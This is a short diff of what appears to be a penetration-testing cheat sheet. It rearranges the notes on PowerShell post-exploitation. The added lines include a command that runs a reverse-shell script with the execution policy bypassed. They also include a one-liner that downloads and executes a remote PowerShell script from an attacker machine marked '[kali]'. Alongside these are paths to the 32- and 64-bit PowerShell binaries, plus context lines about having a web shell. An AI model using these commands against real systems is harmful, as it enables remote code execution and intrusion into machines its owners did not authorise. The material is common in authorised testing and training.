@@ -76,14 +76,21 @@ Have a web shell? Check if server can reach you
 $ sudo tcpdump -i tun0 -n icmp -v
 ```
 
-Exec PowerShell script non-interactively
+Powershell
 ```
+# Exec local PS script
 cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
+# Exec remote PS script
+PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
 ```
 
-Exec remote Powershell script
+Powershell locations on 64bit Windows
 ```
-PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
+# 32bit powershell
+c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+# 64bit powershell
+c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
+C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
 ```
 
 Bypass PHP disable functions
